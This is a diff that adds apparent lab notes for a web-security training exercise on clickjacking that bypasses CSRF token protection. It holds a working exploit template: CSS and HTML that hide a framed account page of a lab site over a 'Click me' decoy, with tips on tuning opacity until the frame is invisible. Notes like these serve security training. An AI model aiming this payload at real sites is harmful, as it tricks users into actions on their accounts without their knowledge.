@@ -1,0 +1,29 @@
+
+[ WEB > CLICKJACKING ]
+
+Basic clickjacking with CSRF token protection
+
+// exploit template:
+// the key is to make an invisible layer of the target website
+// that the user actually clicks to trigger an action.
+// you have to align the target over the decoy
+// use a higher opacity to align (0.5 opacity)
+// then reduce to invisible, e.g., 0.0001 opacity
+<style>
+  iframe {
+    position:relative;
+    width:500px;
+    height: 700px;
+    opacity: 0.5;
+    z-index: 2;
+  }
+  div {
+    position:absolute;
+    top:495px;
+    left:70px;
+    z-index: 1;
+  }
+</style>
+<div>Click me</div>
+<iframe src="https://0ad4006d03ec7624839c15e900710088.web-security-academy.net/my-account"></iframe>
+
